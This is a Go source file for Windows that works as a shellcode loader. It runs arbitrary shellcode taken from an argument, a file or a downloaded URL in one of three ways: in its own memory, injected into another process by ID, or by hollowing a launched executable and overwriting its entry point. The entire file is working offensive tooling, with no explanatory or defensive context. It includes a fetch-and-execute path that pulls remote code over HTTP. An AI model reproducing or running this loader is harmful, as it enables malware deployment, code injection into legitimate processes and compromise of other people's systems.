//go:build windows

package main

import (
	"encoding/binary"
	"flag"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"syscall"
	"unsafe"
)

func main() {
	log.SetFlags(0)

	shellcodeIn := flag.String("i", "", "specify raw shellcode (as bytes)")
	shellcodeFile := flag.String("f", "", "take shellcode from a file")
	shellcodeUrl := flag.String("u", "", "download shellcode from a url")
	processId := flag.Int("p", 0, "process to migrate into (optional, takes precedence over hollowing)")
	hollowPath := flag.String("e", "", "executable path to launch and hollow (optional)")
	flag.Parse()

	shellcode := getShellCode(shellcodeIn, shellcodeFile, shellcodeUrl)

	if *processId > 0 {
		tryInjectShellCode(*processId, shellcode)
	} else if len(*hollowPath) > 0 {
		tryHollowExecutable(*hollowPath, shellcode)
	} else {
		tryRunShellCode(shellcode)
	}
}

func tryRunShellCode(shellcode []byte) {
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	virtualAlloc := kernel32.MustFindProc("VirtualAlloc")
	rtlMoveMemory := kernel32.MustFindProc("RtlMoveMemory")
	createThread := kernel32.MustFindProc("CreateThread")
	waitForSingleObject := kernel32.MustFindProc("WaitForSingleObject")

	destAddress, _, _ := virtualAlloc.Call(0, uintptr(len(shellcode)), 0x1000|0x2000, 0x40)
	// note the use of shellcode[0] below - if the slice itself is used instead of its element, an access violation occurs
	// also, the unsafe.Pointer casting with uintptr needs to occur inline in order for the compiler to recognise this
	rtlMoveMemory.Call(destAddress, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	threadHandle, _, _ := createThread.Call(0, 0, destAddress, 0, 0)
	waitForSingleObject.Call(threadHandle, uintptr(^uint(0)))
}

func tryInjectShellCode(processID int, shellcode []byte) {
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	openProcess := kernel32.MustFindProc("OpenProcess")
	virtualAllocEx := kernel32.MustFindProc("VirtualAllocEx")
	writeProcessMemory := kernel32.MustFindProc("WriteProcessMemory")
	createRemoteThread := kernel32.MustFindProc("CreateRemoteThread")

	// 0x001F0FFF = PROCESS_ALL_ACCESS
	handle, _, _ := openProcess.Call(0x001F0FFF, 0, uintptr(processID))
	destAddress, _, _ := virtualAllocEx.Call(handle, 0, uintptr(len(shellcode)), 0x1000|0x2000, 0x40)
	writeProcessMemory.Call(handle, destAddress, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), 0)
	createRemoteThread.Call(handle, 0, 0, destAddress, 0, 0)
}

type PROCESS_BASIC_INFORMATION struct {
	Reserved1    uintptr
	PebAddress   uintptr
	Reserved2    uintptr
	Reserved3    uintptr
	UniquePid    uintptr
	MoreReserved uintptr
}

func tryHollowExecutable(path string, shellcode []byte) {
	_, err := os.Stat(path)
	if err != nil {
		log.Fatal(err)
	}

	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	createProcessA := kernel32.MustFindProc("CreateProcessA")
	readProcessMemory := kernel32.MustFindProc("ReadProcessMemory")
	writeProcessMemory := kernel32.MustFindProc("WriteProcessMemory")
	resumeThread := kernel32.MustFindProc("ResumeThread")
	ntdll := syscall.MustLoadDLL("ntdll.dll")
	zwQueryInformationProcess := ntdll.MustFindProc("ZwQueryInformationProcess")

	startupInfo := &syscall.StartupInfo{}
	processInfo := &syscall.ProcessInformation{}
	pathArray := append([]byte(path), byte(0))
	// 0x4 = CREATE_SUSPENDED
	createProcessA.Call(0, uintptr(unsafe.Pointer(&pathArray[0])), 0, 0, 0, 0x4, 0, 0, uintptr(unsafe.Pointer(startupInfo)), uintptr(unsafe.Pointer(processInfo)))

	pointerSize := unsafe.Sizeof(uintptr(0))
	basicInfo := &PROCESS_BASIC_INFORMATION{}
	tmp := 0
	zwQueryInformationProcess.Call(uintptr(processInfo.Process), 0, uintptr(unsafe.Pointer(basicInfo)), pointerSize*6, uintptr(unsafe.Pointer(&tmp)))

	imageBaseAddress := basicInfo.PebAddress + 0x10
	addressBuffer := make([]byte, pointerSize)
	read := 0
	readProcessMemory.Call(uintptr(processInfo.Process), imageBaseAddress, uintptr(unsafe.Pointer(&addressBuffer[0])), uintptr(len(addressBuffer)), uintptr(unsafe.Pointer(&read)))

	imageBaseValue := binary.LittleEndian.Uint64(addressBuffer)
	addressBuffer = make([]byte, 0x200)
	readProcessMemory.Call(uintptr(processInfo.Process), uintptr(imageBaseValue), uintptr(unsafe.Pointer(&addressBuffer[0])), uintptr(len(addressBuffer)), uintptr(unsafe.Pointer(&read)))

	lfaNewPos := addressBuffer[0x3c : 0x3c+0x4]
	lfanew := binary.LittleEndian.Uint32(lfaNewPos)
	entrypointOffset := lfanew + 0x28
	entrypointOffsetPos := addressBuffer[entrypointOffset : entrypointOffset+0x4]
	entrypointRVA := binary.LittleEndian.Uint32(entrypointOffsetPos)
	entrypointAddress := imageBaseValue + uint64(entrypointRVA)
	writeProcessMemory.Call(uintptr(processInfo.Process), uintptr(entrypointAddress), uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), 0)

	resumeThread.Call(uintptr(processInfo.Thread))
}

func getShellCode(shellcodeIn, shellcodeFile, shellcodeUrl *string) []byte {
	shellcode := []byte{}

	if len(*shellcodeIn) > 0 && len(*shellcodeFile) == 0 && len(*shellcodeUrl) == 0 {
		shellcode = []byte(*shellcodeIn)
	}
	if len(*shellcodeFile) > 0 && len(*shellcodeIn) == 0 && len(*shellcodeUrl) == 0 {
		s, err := ioutil.ReadFile(*shellcodeFile)
		if err != nil {
			log.Fatalf("invalid or unreadable file path: %s", *shellcodeFile)
		}
		shellcode = s
	}
	if len(*shellcodeUrl) > 0 && len(*shellcodeIn) == 0 && len(*shellcodeFile) == 0 {
		client := &http.Client{}
		req, _ := http.NewRequest(http.MethodGet, *shellcodeUrl, nil)
		resp, _ := client.Do(req)
		if resp.StatusCode != 200 {
			log.Fatalf("unable to download from %s: %d", *shellcodeUrl, resp.StatusCode)
		}
		body, _ := ioutil.ReadAll(resp.Body)
		shellcode = body
	}

	if len(shellcode) == 0 {
		log.Fatal("please provide shellcode either directly (-i), from a file (-f) or from a url (-u)")
	}

	return shellcode
}
